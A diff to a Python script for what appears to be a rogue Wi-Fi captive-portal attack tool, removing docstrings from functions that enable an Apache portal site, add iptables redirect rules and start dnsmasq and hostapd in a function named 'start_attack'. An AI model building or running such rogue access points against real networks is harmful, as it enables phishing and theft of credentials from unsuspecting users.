@@ -495,7 +495,6 @@ def create_vhost_microsoft_dual():
 #####################################################################
 
 def enable_apache_site():
-    """Enables the captive portal site and disables the default."""
     print("[*] Enabling captive portal Apache site...")
     commands = [
         ['a2ensite', 'captive.conf'],
@@ -511,7 +510,6 @@ def enable_apache_site():
 #####################################################################
 
 def enable_apache_site_dual():
-    """Enables the captive portal site and disables the default."""
     print("[*] Enabling captive portal Apache site...")
     commands = [
         ['a2ensite', 'captive.conf'],
@@ -529,7 +527,6 @@ def enable_apache_site_dual():
 #####################################################################
 
 def setup_iptables(iface):
-    """Sets up iptables rules for redirection."""
     print("[*] Setting up iptables rules...")
     commands = [
         ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
@@ -546,7 +543,6 @@ def setup_iptables(iface):
 #####################################################################
 
 def start_attack():
-    """Kills previous processes and starts dnsmasq and hostapd (Wi-Fi logs only)."""
     global dnsmasq_proc, hostapd_proc
     print("[*] Starting the attack...")
 
@@ -657,7 +653,6 @@ def start_attack_dual(channel1: str, channel2: str):
 #####################################################################
 
 def cleanup_dual(signum, frame):
-    """Cleans up the system upon script termination."""
     print("\n\n[*] CTRL+C detected. Cleaning up...")
     
     if dnsmasq_proc:
@@ -777,7 +772,6 @@ def cleanup_dual(signum, frame):
 #############################################################################
 
 def cleanup(signum, frame):
-    """Cleans up the system upon script termination."""
     print("\n\n[*] CTRL+C detected. Cleaning up...")
     
     if dnsmasq_proc:
